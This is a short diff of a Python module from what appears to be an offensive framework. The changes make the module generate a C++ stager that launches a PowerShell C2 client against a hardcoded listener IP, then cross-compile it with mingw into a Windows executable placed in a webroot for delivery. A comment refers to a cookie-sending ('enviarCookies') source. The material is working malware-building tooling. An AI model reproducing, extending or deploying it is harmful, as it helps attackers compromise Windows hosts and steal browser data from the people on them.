@@ -39,15 +39,20 @@ class executing_payload(Module):
     })
 
 	def run(self):
+		parent_path = "Prueba/sourcecodes/"
+		parent_webroot_path = "Prueba/webroot/"
 
 		c2client = ''.join(list(self.config.get('PAYLOAD')))
 		ipaddr   = ''.join(list(self.config.get('LHOST')))
 		name     = ''.join(list(self.config.get('EXE_NAME')))
 
-
 		c2client = "client.ps1"
 		ipaddr = "10.10.1.13"
-		name = 'exe'
+		name = 'ejecutarPSs.cpp'
+		fullname = parent_path+name
+		exename = "envia"
+		outfile = parent_webroot_path + exename
+		
 
 
 		STARTC2 = '''
@@ -76,6 +81,10 @@ class executing_payload(Module):
 		}
 		''' % (c2client, ipaddr)
 
-		f = open(name+".cpp","w")
+		f = open(fullname,"w")
 		f.write(STARTC2)
-		print("File "+name+" created.")
+		print("Archivo "+ fullname + " creado.")
+		#i686-w64-mingw32-g++ enviarCookies.cpp -o envia -static-libgcc -static-libstdc++ -lwsock32
+		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-static-libgcc", "-static-libstdc++", "-lwsock32"]
+		subprocess.Popen(args)
+		print("Compilado {}.".format(outfile))
